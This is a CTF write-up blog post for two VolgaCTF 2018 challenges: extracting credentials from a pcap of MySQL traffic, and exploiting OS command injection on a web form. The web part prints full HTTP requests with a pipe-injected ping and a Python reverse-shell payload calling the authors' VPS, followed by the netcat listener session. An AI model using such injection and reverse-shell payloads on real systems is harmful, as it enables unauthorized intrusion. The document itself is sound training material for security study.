---
layout: post
title: "VolgaCTF 2018 qual writeups"
description: "Writeups and solutions to some of the VolgaCTF 2018 qualifying challenges"
categories: [Online CTF]
tags: [CTF, VolgaCTF]
author: peter_aaby


---
# Writeups included in this post
* Old Government Site (web 150 pts)
* Master (forensics 100 pts)

# Master (forensics 100 pts)
Solved by: Peter Aaby and Ryan Forbes
>We've found one of C&C servers that controlled recent DDoS attack, however we can't get credentials.
http://master.quals.2018.volgactf.ru:3333
Also, we've got a communication traffic dump between C&C servers.
capture.pcap
Can you get in?

This challenge starts out by analysing a pcap file with network traces from the C&C servers which constituse a lot of communication. To limit the amount of packets to analyse a filter is used as shown on the first line in below code snippet. First line uses 3 filters that represents the 3-way TCP handshake and the most interesting connections is shown on the second line starting with packet number 108. 

Using the "follow tcp" stream on packet 108 shows a lot of database trafic including usernames and passwords. The usernames and passwords cold potentially be used to access the website provided in the challenge and indeed testing with the one from below snippet gives a "no flag for you" response. There we are, somewhat on the right track but with a wall of text to exstract credentials from.

```
tcp.seq==1 && tcp.ack==1 && tcp.len
108	21.911274	46.161.54.111	95.213.194.243	MySQL	404	Response OK


B..P....Z"....A.......................................................L..Q....Z.....K............................ ..U......std.!.!...magicdb.BEGIN2...:..R....Z.....9...8.....m........magicdb..users...........|E..V..S....Z.....U.........m.................Blaze_Blaster2018.ipl7j4v3td499k2720s7j42o3f.... ..T....Z...............'......../.VB..U.
..Z"....A.......................................................L..V.
..Z.....K...8........................ ..U......std.!.!...magicdb.BEGIN@...:..W.
..Z.....9...q.....m........magicdb..users..............&P..X.
```

To quickly grab all credentials we use a regular expression as such as[_a-zA-Z0-9]+\\.[^\\.\|\W]{24,}+ and then copy/paste the matches to a textfile. The result is 499 lines with credentials to try against the website. We tried a lot of credentials without finding a flag and later realised that some of the credentials didnt work because the passwords were too long compared to the other users. 

Next step was therefore searching through the credentials again and try those with longer passwords. Interestingly, the admin credentials was amongst those with long credentials and we manually tested with the full password, then with the full password minus the last char, then again minus another and ... see below c",) 

```
orig credentials 	admin.aep7Woo9eef7quiedooPh0oowDgN 	> Invalid user
minus 1 character 	admin.aep7Woo9eef7quiedooPh0oowDg 	> Invalid user
minus 2 characters 	admin.aep7Woo9eef7quiedooPh0oowD 	> Invalid user
minus 3	characters 	admin.aep7Woo9eef7quiedooPh0oow 	> VolgaCTF{PLA1N_TEXT_REPLICATION_IS_@_B@D_THING}
```


# Old Goverment Site (web 150). 
Solved by: Peter Aaby and Charley Celice
>It's a old goverment web-site. Please, don't touch that. It works properly.
http://old-government-site.quals.2018.volgactf.ru:8080


Browsing to the website <http://old-government-site.quals.2018.volgactf.ru:8080> and clicking around shows that each page is requested through URI ID's using GET requests and the following table show's the clickable links and how they map to ID's. The ID's are mapped by simply browsing around and enumerating the site and its functionality.

|URI ID|Site content|
|------|------------|
|36|	Contact|
|33|	About |
|2|		Bulky waste collection|
|5|		Electric Vehicle charging infrastructure
|23|	Council Tax

Interestingly, the ID's are jumping quite a bit which could be hint that there's something to discover here and trying to access <http://old-government-site.quals.2018.volgactf.ru:8080/page?id=3> gives a page not found. Using Burp Suite, its easy and quick to enumerate these ID's using the intruder-function and adjusting the parameter with a payload of numbers starting at 1-1000 in increments of 1.

Below picture shows the result from Burp which is sorted by lenght and now reveals a URI ID=18 (top one) with a length of 5000. Browsing to the <http://old-government-site.quals.2018.volgactf.ru:8080/page?id=18> shows a page about "Private garbage company" with a form submission.
![Burp output after enumerating URI id's](/img/2018-03-25-oldGovBurp.png){:class="img-responsive"}

Right, so we can now post something to the website but its still uncertain what is happening with the content submitted in the form. Returning to Burp, capturing a form submission and sending this to the repeater allows for easy manipulation and understanding of the response caused by adjusting arguments, headers, id's and so on. Unfortunately, it was not possible so see anything from the response within Burp but trying to inject another OS command such as ping could possibly be observed on our VPS. 

As such, we setup a filter on our VPS to show only ICMP packets and started to fuzz the form submission with different OS command injection parameters such as **; \|  \$\{\} &&** and so on. Tadaaaa, a pipe was working and as can be seen below we managed to get the old goverment site to send a ping back to the VPS.

```
OS COMMAND INJECTION / FORM SUBMISSION TO WEBSITE
POST /page?id=18 HTTP/1.1
Host: old-government-site.quals.2018.volgactf.ru:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://old-government-site.quals.2018.volgactf.ru:8080/page?id=18
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Connection: close
Upgrade-Insecure-Requests: 1

site=|ping -c3 vps.enusec.org&description=d



RESPONSE ON VPS
...@enusec-vps:~# tcpdump icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on venet0, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes
18:42:03.903740 IP enusec-vps > 188.246.233.28: ICMP echo reply, id 12015, seq 1, length 64
18:42:04.904734 IP 188.246.233.28 > enusec-vps: ICMP echo request, id 12015, seq 2, length 64
18:42:04.904768 IP enusec-vps > 188.246.233.28: ICMP echo reply, id 12015, seq 2, length 64
18:42:05.906336 IP 188.246.233.28 > enusec-vps: ICMP echo request, id 12015, seq 3, length 64
18:42:05.906362 IP enusec-vps > 188.246.233.28: ICMP echo reply, id 12015, seq 3, length 64

```

Natural next step, change the OS command injection to setup a reverse shell back to our VPS.
```html
POST /page?id=18 HTTP/1.1
Host: old-government-site.quals.2018.volgactf.ru:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://old-government-site.quals.2018.volgactf.ru:8080/page?id=18
Content-Type: application/x-www-form-urlencoded
Content-Length: 251
Connection: close
Upgrade-Insecure-Requests: 1

site=|python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("vps.enusec.org",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'&&description=d
```

To grab the reverse shell we used a VPS with an open netcat listener and waited for the callback from the Old Goverment Website. Below is a dump of the output from the VPS showing a sucessfull callback from the website. We now have a reverse shell and the flag was found in the root directory.
```
...@enusec-vps:~# nc -lvp 7777
listening on [any] 7777 ...
188.246.233.28: inverse host lookup failed: Unknown host
connect to [176.126.247.225] from (UNKNOWN) [188.246.233.28] 42526
/bin/sh: 0: can't access tty; job control turned off
$ ls
app.rb
pages
public
views
$ ls -la
total 24
drwxr-xr-x 5 root root 4096 Mar 23 19:37 .
drwxr-xr-x 3 root root 4096 Mar 23 19:37 ..
-rw-r--r-- 1 root root  607 Mar 23 19:37 app.rb
drwxr-xr-x 2 root root 4096 Mar 23 19:37 pages
drwxr-xr-x 4 root root 4096 Mar 23 19:37 public
drwxr-xr-x 2 root root 4096 Mar 23 19:37 views
$ ls -la /var
total 44
drwxr-xr-x 11 root root   4096 Mar 16 19:00 .
drwxr-xr-x 22 root root   4096 Mar 23 19:08 ..
drwxr-xr-x  2 root root   4096 Mar 24 17:02 backups
drwxr-xr-x  8 root root   4096 Mar 16 19:04 cache
drwxr-xr-x 43 root root   4096 Mar 23 19:07 lib
drwxrwsr-x  2 root staff  4096 Apr 13  2016 local
lrwxrwxrwx  1 root root      9 Mar 16 19:00 lock -> /run/lock
drwxrwxr-x  9 root syslog 4096 Mar 25 16:02 log
drwxrwsr-x  2 root mail   4096 Mar 16 19:00 mail
drwxr-xr-x  2 root root   4096 Mar 16 19:00 opt
lrwxrwxrwx  1 root root      4 Mar 16 19:00 run -> /run
drwxr-xr-x  4 root root   4096 Mar 16 19:01 spool
drwxrwxrwt  3 root root   4096 Mar 25 06:43 tmp
$ ls /
bin
boot
dev
etc
flag
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
$ cat /flag 
VolgaCTF{dedicated_to_all_goverment_site}$ ^C  
```

